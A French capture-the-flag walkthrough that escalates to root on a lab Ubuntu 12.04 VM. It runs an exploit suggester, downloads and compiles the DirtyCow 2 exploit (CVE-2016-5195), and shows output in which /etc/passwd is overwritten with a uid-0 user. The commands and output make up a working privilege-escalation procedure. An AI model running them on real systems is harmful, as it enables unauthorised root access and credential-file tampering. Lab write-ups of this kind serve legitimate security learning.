# DirtyCow 2

## On cherche a trouver des `exploit` dans notre machine

On lance [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh) pour avoir une idée des failles à explorer

```shell
$ cat exploit-suggested.txt

Available information:

Kernel version: 3.2.0
Architecture: i386
Distribution: ubuntu
Distribution version: 12.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
...
```

Apres quelque essais, on trouve que dirtycow 2 fonctionne parfaitement !

## Description

Cet `exploit` utilise comme base le `pokemon exploit of the dirtycow vulnerability` et génère automatiquement un nouveau mot de passe. L'utilisateur sera invité a entrer le nouveau mdp au lancement du binaire. Le fichier original `/etc/passwd` sera alors sauvegardé dans `/tmp/passwd.bak` et écrira par dessus l'utilisateur root. Après avoir lancé `l'exploit`, on devrait pouvoir se connecter à notre nouvel utilisateur.

Le nouvel utilisateur s'appellera `firefart`.

## Download exploit C file

[DirtyCow](https://www.exploit-db.com/download/40839)

## Process

On repart du `user Laurie` pour se connecter en `ssh`

```shell
$ ssh laurie@192.168.56.104 -p 22
```

### Host

```shell
$ wget https://www.exploit-db.com/download/40839 ; mv 40839 40839.c

$ scp 40839.c laurie@192.168.56.104:~/.
```

### VM

```
$ gcc -pthread -O2 40839.c -lcrypt

$ ./a.out
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

$ su firefart
Password:

firefart:$ id
uid=0(firefart) gid=0(root) groups=0(root)
```
